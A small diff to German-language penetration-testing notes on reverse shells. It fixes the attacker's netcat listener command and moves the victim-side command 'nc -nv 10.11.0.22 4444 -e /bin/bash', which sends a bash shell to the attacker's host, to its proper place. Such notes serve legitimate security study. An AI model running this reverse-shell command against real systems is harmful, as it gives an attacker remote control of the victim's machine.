@@ -30,6 +30,7 @@ Wenn nun nicht die Möglichkeit besteht eine #BindShell zu öffnen, da es zum Be
 Hierbei öffnet der Angreiffer einen #Listener auf seinem Client und das Opfer sendet eine Shell an den geöffneten Port
 
 Angreifer:
-`nc -nv 10.11.0.22 4444 -e /bin/bash` <- Wartet auf Verbindung
+`nc -nlvp 4444` <- Wartet auf Verbindung
 
 Opfer:
+`nc -nv 10.11.0.22 4444 -e /bin/bash`
